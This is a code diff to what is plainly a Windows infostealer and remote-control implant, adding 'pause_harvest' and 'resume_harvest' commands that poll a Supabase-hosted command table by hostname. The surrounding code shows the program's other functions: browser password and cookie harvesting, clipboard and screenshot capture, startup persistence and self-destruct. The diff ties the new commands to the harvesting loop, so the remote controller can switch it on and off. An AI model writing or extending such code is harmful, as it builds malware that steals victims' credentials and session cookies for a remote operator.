@@ -48,6 +48,7 @@ static DWORD g_lastAutoScreenshot = 0;
 static std::vector<std::string> g_triggers;
 static bool g_running = true;
 static bool g_selfDestructing = false;
+static bool g_harvestPaused = false;
 static std::string g_hostname;
 static std::string g_lastClipboard;
 static std::string g_lastPasswordDigest;
@@ -495,6 +496,44 @@ static bool CheckSelfDestruct() {
         std::wstring patchPath = SUPABASE_CONTROL_PATH;
         patchPath += L"?id=eq." + ToWide(rowId);
         HttpRequest(L"PATCH", patchPath.c_str(), patch, response);
+    }
+    return true;
+}
+
+static bool CheckPauseHarvestCmd() {
+    std::wstring query = SUPABASE_CONTROL_PATH;
+    query += L"?command=eq.pause_harvest&executed=eq.false&hostname=eq.";
+    query += ToWide(g_hostname);
+    query += L"&select=id";
+    std::string response;
+    if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
+    if (response.empty() || response == "[]") return false;
+    std::string rowId = ExtractJSONNumber(response, "id");
+    if (!rowId.empty()) {
+        std::string patch = "{\"executed\":true}";
+        std::wstring patchPath = SUPABASE_CONTROL_PATH;
+        patchPath += L"?id=eq." + ToWide(rowId);
+        HttpRequest(L"PATCH", patchPath.c_str(), patch, response);
+        g_harvestPaused = true;
+    }
+    return true;
+}
+
+static bool CheckResumeHarvestCmd() {
+    std::wstring query = SUPABASE_CONTROL_PATH;
+    query += L"?command=eq.resume_harvest&executed=eq.false&hostname=eq.";
+    query += ToWide(g_hostname);
+    query += L"&select=id";
+    std::string response;
+    if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
+    if (response.empty() || response == "[]") return false;
+    std::string rowId = ExtractJSONNumber(response, "id");
+    if (!rowId.empty()) {
+        std::string patch = "{\"executed\":true}";
+        std::wstring patchPath = SUPABASE_CONTROL_PATH;
+        patchPath += L"?id=eq." + ToWide(rowId);
+        HttpRequest(L"PATCH", patchPath.c_str(), patch, response);
+        g_harvestPaused = false;
     }
     return true;
 }
@@ -1895,11 +1934,13 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 CheckAndHandleExec();
                 std::string wfRowId = CheckWifiCmd();
                 if (!wfRowId.empty()) HandleWifiCmd(wfRowId);
+                CheckPauseHarvestCmd();
+                CheckResumeHarvestCmd();
             }
             if (counter % 120 == 0 && !g_selfDestructing) {
                 EnsureStartupEntry();
             }
-            if (counter % 300 == 0 && !g_selfDestructing) {
+            if (counter % 300 == 0 && !g_selfDestructing && !g_harvestPaused) {
                 HarvestBrowserPasswords();
                 HarvestBrowserCookies();
             }
